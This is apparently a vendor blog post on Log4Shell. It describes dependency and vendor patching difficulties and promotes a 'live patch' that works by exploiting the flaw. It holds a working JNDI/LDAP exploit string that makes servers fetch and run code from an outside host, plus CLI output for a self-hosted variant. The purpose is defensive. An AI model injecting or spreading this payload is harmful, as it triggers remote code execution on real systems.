**TL;DR:** This string will temporarily fix your systems by patching them against Log4Shell, but *please* read the rest
of this post before you use it!

```

## Why Log4Shell is an especially painful vulnerability

Mitigating a vulnerability in a single dependency used in one project is often difficult. Code must be written, tests must
pass, changes must be approved, it has to be deployed, and finally monitored. A vulnerability in a logging framework,
especially one as prolific as Log4j, is often not a single vulnerability, either. It's often not just a matter of updating
_your_ code, but also updating any of your dependencies that are _also using Log4j_.

## Living in Dependency Hell

Simply, one might ask, "Why not just update the dependency to the latest version?"

But updating all of your dependencies at once can be dangerous.

- What if you're several versions behind and the Log4j fix isn't ported to your version?
- What if changing that version causes your tests to not pass?
- What if you don't have tests to check correctness of the change... does that mean your app is suddenly broken?

These questions are what often keep organizations from updating their dependencies in the first place. A vulnerability
like Log4Shell forces you to not just patch the vulnerability in your code, but also deal with the (potentially years)
of tech debt that's attached to it.

## Down the rabbit hole...

But your vendors are also using Log4j. If your vendor software is a black box that runs locally on-prem or remotely in the cloud,
there is no way to simply "update" it to the latest version. You have no access to their source code or their dependencies.

You are left helpless until mitigation steps are given to you.

With this current Log4j fiasco, we've seen some vendors have
[recommended turning off their service](https://news.ycombinator.com/item?id=29562255)
until they have mitigated Log4Shell themselves.

Being left in the dark by a company you have paid to provide you a service isn't tolerable. Companies often depend deeply
on the vendor's software for their own business. It's simply not possible to just "wait" until it's patched.

## Stuck between worlds

All the while, while companies are panicked and struggling to hang on, attackers are getting more sophisticated with
their payloads. They are bypassing WAFs, the first line of defense, with
[increasingly sophisticated techniques](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words).

Not only that, they're also embedding themselves, discretely, into your infrastructure while you attempt to roll out
changes to fix issues.

The fallout from Log4Shell is going to take a _very_ long time to understand. We've
[barely even scratched the surface](https://arstechnica.com/information-technology/2021/12/as-log4shell-wreaks-havoc-payroll-service-reports-ransomware-attack/)
of what the real impact to society is going to be.

## A false sense of security

And, if you thought that was bad, I regret to inform you: That's not even the worst of the situation.

Even if you've managed to patch this, and your vendors have patched, it's still possible that
[another vulnerability is discovered](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046)
that undoes the mitigation work you've already put in place, resetting the cycle.

Log4Shell is a pernicious bugger, indeed!

## An unconventional silver lining

If you find yourself stuck between a rock and a hard place for fixing this issue at your company, you might find
yourself wishing for something better. Fortunately, the clever people of the internet have come up with a solution
that may help you remedy this painful situation.

By placing this string...

```
${jndi:ldap://patch.log4shell.com:1389/a}
```

...anywhere you can in your infrastructure that you're vulnerable to Log4Shell, you will be rolling out a temporary fix
that gives you more time to patch.

We run that server, but it's been built due to the work of [many](https://github.com/hillu/local-log4j-vuln-scanner/)
smart [people](https://github.com/corretto/hotpatch-for-apache-log4j2) working on and dealing with the fallout
from Log4Shell. We've just made it a little easier for you to use by hosting it for you.

:::warn There be dragons!
This string will attempt to exploit the Log4Shell vulnerability and apply a patch to your live system. While this
patch has been tested on a number of systems, your system might be different and could possibly crash. You have been warned.

If it doesn't work for some reason, _your server will hang and possibly need a manual restart._
:::

## Running the Patch Code yourself

Since LunaSec is an Open Source company, we pride ourselves in being transparent in the work that we do.

You can [run the patch server yourself](https://github.com/lunasec-io/lunasec/releases/) by downloading our `log4shell`
CLI tool. And, if you're curious, you can review the full source code of this live patch service on
[our repo](https://github.com/lunasec-io/lunasec/tree/master/tools/log4shell).

**We'll be publishing a technical deep dive into our patch tool tomorrow, so [stay tuned](#stay-updated) for that.**

```shell
âžœ  log4shell git:(hotpatch-improvements) ./log4shell livepatch
9:19AM INF Payload URL not provided. Using the default payload url.
        defaultPayloadUrl: http://localhost:8000/
9:19AM INF Starting Log4Shell live patch LDAP and payload servers
9:19AM INF Once both servers have started, use payload string: '${jndi:ldap://localhost:1389/a}' to hotpatch your servers.
9:19AM INF Started live patch payload server
        addr: 0.0.0.0:8000
9:19AM INF Started live patch server
        addr: 0.0.0.0:1389
```

_(If you find this tool helpful, consider giving us a star, please! ;))_

## How does it work?

This string will trigger the Log4Shell vulnerability and attempt to [exploit it](https://www.lunasec.io/docs/blog/log4j-zero-day/).
Instead of your server being taken over by an attacker though, your server will actually be patched against further
exploitation.

While unorthodox, this is a very effective way to mitigate Log4j vulnerabilities, especially for any software you have no
control over (like your vendors).

:::info
We're also offering a paid, commercial service that will perform the same mitigation work for you, but is managed by us.

Please see our Live Patching service for more information, or [schedule a time](https://lunasec.youcanbook.me) to talk
with us about it.

## Moving Forward

We have extensively written about [steps for mitigating Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide),
and we encourage you to refer to these steps as you work to address this vulnerability. We strongly urge you and
your team to work towards updating your Log4j versions to `2.16.0` as you are able to (even if you've migrated to
`2.15.0` already).

If you do find yourself stuck in Dependency or Vendor hell though, you can always try to use the
[Live Patch](#an-unconventional-silver-lining)
or [contact us](https://www.lunasec.io/contact) about help you with a custom solution instead.

We're living in unusual times, and it's not crazy to try something new!
